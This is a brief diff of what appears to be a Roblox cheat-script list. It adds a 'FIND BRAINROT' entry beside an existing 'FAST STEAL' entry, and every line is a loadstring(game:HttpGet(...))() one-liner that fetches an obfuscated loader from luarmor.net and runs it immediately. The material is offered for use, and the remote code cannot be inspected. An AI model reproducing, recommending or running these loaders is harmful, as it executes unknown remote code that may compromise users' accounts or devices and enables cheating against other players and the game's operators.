@@ -3,3 +3,6 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d242fd0441c8ba
 
 FAST STEAL:
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3df8133541564751d34283ae02077269.lua"))()
+
+FIND BRAINROT:
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e9dc250fbc8890db5a9c563ac01d9a1f.lua"))()
